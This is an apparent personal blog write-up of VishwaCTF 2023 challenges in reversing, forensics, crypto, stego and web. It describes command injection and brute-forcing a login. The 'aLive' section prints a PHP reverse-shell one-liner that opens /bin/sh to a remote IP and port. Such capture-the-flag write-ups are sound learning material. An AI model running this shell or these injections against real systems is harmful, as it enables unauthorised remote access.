---
title: "VishwaCTF 2023"
date: 2023-03-31
categories: [CTF, Writeup]
tags: [Web, Stego, Crypto, Rev]
description: These are the writeups for the n00bzCTF 2023. I participated ended up at
             place 260/1087.
pin: false
math: false
mermaid: true
#image:
#  path: /assets/img/posts/htb-machine-name/banner.png
#  alt: "HTB Machine Banner"
#  width: 800
#  height: 400
---

> **VishwaCTF 2023 - Writeup**  
> Place: 260/1087

---

## Reverse Engineering

### Phi Calculator
>Python is a very easy and useful language for CTF players
>as well as for Hackers use some coding skills and get your flag.


We have a python file, which if we run it is like a game. It looks like we have the
standard version, but there is a full version. To get the Full version we need to
enter a License Key.

![Phi calc](/assets/img/vishwaCTF2023/phi_calc_01.png)


We have the code, so I took a look at it and found we have a piece of the Flag.
We have a static part and need to find the dynamic part.

![Phi Calc 2](/assets/img/vishwaCTF2023/phi_calc_02.png)

After further investigation of the source code, I found, that the dynamic key part ist validated
in a funtion.
There are some cases to test for the key.

![Phi Calc 3](/assets/img/vishwaCTF2023/phi_calc_03.png)


So if we print all of the cases, we get the dynamic part of the flag.
With a simple script like this:

![Phi Calc script](/assets/img/vishwaCTF2023/phi_calc_04.png)

We get the rest of the flag. "b7cdc517".


FLAG: `VishwaCTF{m4k3_it_possibl3_b7cdc517}`

---

## Forensics
### The Sender Condrum
>Marcus Got a Mysterious mail promising a flag if he could crack the password to the file.

In this challenge we were given with an email and a zip file. We need to find the password
for the zip file in order to get the flag.

If we take a look at the email, we see a text:

![sender](/assets/img/vishwaCTF2023/thesender_01.png)

The solution for the Text is "Name", so we are looking for a name as the password.
I tried Marcus, but this was not the right Password.

Then I found someting interesting, the return path was a name that was in no context before.
"BrandoLee", so I tried this as a password and it was the right one.

1[sender 2](/assets/img/vishwaCTF2023/thesender_02.png)


FLAG: `VishwaCTF{1d3n7i7y_7h3f7_is_n0t_4_j0k3}`

---
---
---

## Crypto
### Th Indecipherable Cipher
>Our crypto specialist Mr.Kasiski is currently unavailable, so help us decode this string.
>String: j3qrh4kgz3iptmyqxcw0zkm8i5xugs5lwl0lrwvirwktlqinexcw0zkmq5nqvpebpor5wqipqhw2ikzm4ipktzlr

So we need to decode tis string.
We have a hint, that Mr. Kasiski should decode this string, so we know it has to be a vignere cipher.

![cipher](/assets/img/vishwaCTF2023/crypto_01.png)

FLAG: `VishwaCTF{friedrichwilhelmkasiskiwastheonewhodesignedtheaaakasiskiexaminationtodecodevignerecipher}`

---
---
---

## Stego
### Guatemala
>My friend wanted to install an antivirus for his computer, but the creator of the antivirus was caught!

In this challange we get a .gif file. I tried exiftool the view if there is some interesting
metadata and ther was.

![stego 1](/assets/img/vishwaCTF2023/guatemala_01.png)

There was a comment which looks like a base64 encoded string, so I tried to decode it.

![stego 2](/assets/img/vishwaCTF2023/guatemala_02.png)

And we get the Flag.

FLAG: `VishwaCTF{pr073c7_ur_3X1F}`

---

### Can you see me?
>A magician made the seven wonders disappear. But people claim they can still feel their presence in the
>air.

We get a file. As always I check the metadata with exiftool, but nothing interesting
there. Then I checked with binwalk if there are some hidden files.

![see 1](/assets/img/vishwaCTF2023/canyouseeme_01.png)

As we can see there is a file called "hereissomething.wav".
After extracting the file, we can use some .wav file analyzers and look at the output.


![see 2](/assets/img/vishwaCTF2023/canyouseeme_02.png)


FLAG: `VishwaCTF{n0w_y0u_533_m3}`

---
---
---

## Web
### Payload

In this challage we have just this website given. There is a button which gives us some details about
the system.

![payload 1](/assets/img/vishwaCTF2023/payload_01.png)

I searched for some common endpoints like robots.txt and found the following script.
It seems like that we can execute the "cmd" command and then read the index.php file.

![payload 2](/assets/img/vishwaCTF2023/payload_02.png)


If we try to cat the index.php file with the command cmd=cat index.php we can see the flag in the source
code.

![payload 3](/assets/img/vishwaCTF2023/payload_03.png)

FLAG: `VishwaCTF{y0u_f-o-u-n-d_M3}`

---
### aLive
>In my college level project I created this website that tells us if any domain/ip is active or not. But
>there is a catch.

We have been given a webiste that checks if a website is active or not.

![alive](/assets/img/vishwaCTF2023/alive_01.png)

We can execute some command line commands like ls, but cat gives a error message, so I tried to get a
reverse shell from the input.
From pentestermonkey I grabed an php one liner:

```php
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3>&3 2>&3");'
```

![alive2](/assets/img/vishwaCTF2023/alive_02.png)

After that we are able to read the flag.txt

FLAG: `VishwaCTF{b1nD_cmd-i}`

---
### Spookey
>I forgot my login credentials again!!

We were given again with a website and a login form.

![spooky1](/assets/img/vishwaCTF2023/spooky_01.png)

I tried to find some SQL injection, but it seems not working, so I tried a directory bruteforce to maybe
find some hidden endpoints. Ans see there, I found sitemap.xml.

![spooly2](/assets/img/vishwaCTF2023/spooky_02.png)


It seems that there are another two endpoints. /creds/users.txt and /creds/pass.txt.

![spooky3](/assets/img/vishwaCTF2023/spooky_03.png)

It looks like we got some credentials to bruteforce the login. So I did that and found the credentials


```text
User: shrekop
Pass: VmU5gnXKYN2vLp48
```


If we log in, we are just given a static website which says, that we are logged in as a user.
So me idea was to get somehow admin rights.

![spooky4](/assets/img/vishwaCTF2023/spooky_04.png)

I added the parameter admin=true to the request and it obtained the flag.

![spooky5](/assets/img/vishwaCTF2023/spooky_05.png)

FLAG: `ViswaCTF{h1dd3n_P@raMs}`

---

### Mascot
>Very gracious host!!

We were given with a website were we can play tictactoe.

![mascot 1](/assets/img/vishwaCTF2023/mascot_01.png)


First thing was again to check a robots.txt file, but this time there is 
not endpoint like this. So i testet the .git endpoint and found an 
interesting directory.

![masco 2](/assets/img/vishwaCTF2023/mascot_02.png)

I looked around every folder and found one url from a github repository.

![mascot 3](/assets/img/vishwaCTF2023/mascot_03.png)

In the Repository was a file called "FLAGGGGG.md" and in it we find the 
flag.

![mascot 4](/assets/img/vishwaCTF2023/mascot_04.png)


FLAG: `VishwaCTF{0ctOc@t_Ma5c0t}`

---

